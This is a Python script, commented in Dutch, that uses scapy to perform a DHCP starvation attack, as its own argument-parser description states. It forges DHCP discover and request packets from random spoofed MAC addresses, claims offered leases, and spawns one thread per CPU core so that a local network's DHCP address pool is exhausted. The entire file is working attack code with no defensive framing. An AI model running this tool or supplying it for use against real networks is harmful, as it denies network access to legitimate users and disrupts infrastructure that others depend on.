from scapy.all import srp, ARP, Ether, IP, UDP, BOOTP, DHCP, sniff, sendp
from random import randint
import threading
import ipaddress
import subprocess
import psutil
import math
import argparse

def generate_random_mac():
    # Genereer een random MAC-adres
    from random import randint
    mac_int = [randint(0x00, 0xff) for i in range(6)]
    mac=":".join(map(lambda x: "%02x" % x, mac_int))
    return mac

def mac_to_bytes(mac_addr: str) -> bytes:
    # Converts a MAC address string to bytes.
    return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")

def delayed_send(packet, delay):
    # Verstuur een pakket met een delay
    def send_packet(packet):
        sendp(packet)
    threading.Timer(delay, send_packet, [packet]).start()

def generate_ip_list(interface):
    network = subprocess.check_output(f"ip -4 -br a show {interface} | awk '{{print $3}}'",shell=True).decode("utf-8").strip()
    ip_network = ipaddress.ip_network(network, strict=False)
    ip_list = [str(ip) for ip in ip_network]
    return ip_list

def wait_for_dhcp_offer(xid, dhcp_offer):
    def check_up(packet):
        if packet.haslayer(DHCP):
            if packet[DHCP].options[0][1] == 2 and packet[BOOTP].xid == xid:
                print("DHCP OFFER received")
                dhcp_offer.append(packet)
                return True
            else:
                return False
    return check_up

def wait_for_dhcp_ack(xid):
    def check_up(packet):
        if packet.haslayer(DHCP):
            print(f"message-type: {packet[DHCP].options}")
            if packet[DHCP].options[0][1] == 5 and packet[BOOTP].xid == xid:
                print("DHCP ACK received")
                return True
            else:
                return False
    return check_up

def send_dhcp_discover(dhcp_offer):
    ethernet_layer=Ether(dst='ff:ff:ff:ff:ff:ff',src=generate_random_mac())
    IP_layer=IP(src='0.0.0.0',dst='255.255.255.255')
    UDP_layer=UDP(sport=68,dport=67)
    BOOTP_layer=BOOTP(chaddr=mac_to_bytes(ethernet_layer.src), xid=randint(0, 0xffffffff))
    DHCP_layer=DHCP(options=[('message-type','discover'),'end'])
    packet=ethernet_layer/IP_layer/UDP_layer/BOOTP_layer/DHCP_layer

    delayed_send(packet, 0.2)
    sniff(store=0,timeout=2, stop_filter=wait_for_dhcp_offer(BOOTP_layer.xid, dhcp_offer))

def send_dhcp_request(mac_address, offered_xid, offered_ip, server_identifier):
    ethernet_layer=Ether(dst='ff:ff:ff:ff:ff:ff',src=mac_address)
    IP_layer=IP(src='0.0.0.0',dst='255.255.255.255')
    UDP_layer=UDP(sport=68,dport=67)
    BOOTP_layer=BOOTP(chaddr=mac_to_bytes(mac_address), xid=offered_xid)
    DHCP_layer=DHCP(options=[('message-type','request'),('server_id',server_identifier),('requested_addr',offered_ip),'end'])
    packet=ethernet_layer/IP_layer/UDP_layer/BOOTP_layer/DHCP_layer

    delayed_send(packet, 0.2)
    sniff(store=0, stop_filter=wait_for_dhcp_ack(offered_xid))

def get_max_cores():
    max_thread_count = psutil.cpu_count(logical=True)
    return max_thread_count

def start_dhcp_conn(interface):
        threads=[]
        for i in range(1,math.ceil(len(generate_ip_list(interface))/get_max_cores())):
            dhcp_offer=[]
            dhcp_ack=[]
            send_dhcp_discover(dhcp_offer)
            if len(dhcp_offer) != 0:
                send_dhcp_request(dhcp_offer[0][Ether].src, dhcp_offer[0][BOOTP].xid, dhcp_offer[0][BOOTP].yiaddr, dhcp_offer[0][BOOTP].siaddr)
        for thread in threads:
            thread.join()

def execute_starve_silly_dhcp_server(interface):
    max_thread_count = get_max_cores()  # Het maximale aantal beschikbare CPU-cores verkrijgen
    for i in range(0, max_thread_count):
        try:
            thread = threading.Thread(target=start_dhcp_conn, args=(interface,))  # Een nieuwe thread maken voor elke aanval
            thread.start()  # De thread starten
            print(f"Thread {i} started (http)")  # Afdrukken dat de thread is gestart
        except Exception as e:
            print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Voer een DHCP starvation aanval uit.")
    parser.add_argument("--interface", required=True, help="De interface die zich in het netwerk van de DHCP server bevindt")

    args = parser.parse_args()

    interface = args.interface
    execute_starve_silly_dhcp_server(interface)

if __name__ == "__main__":
    main()
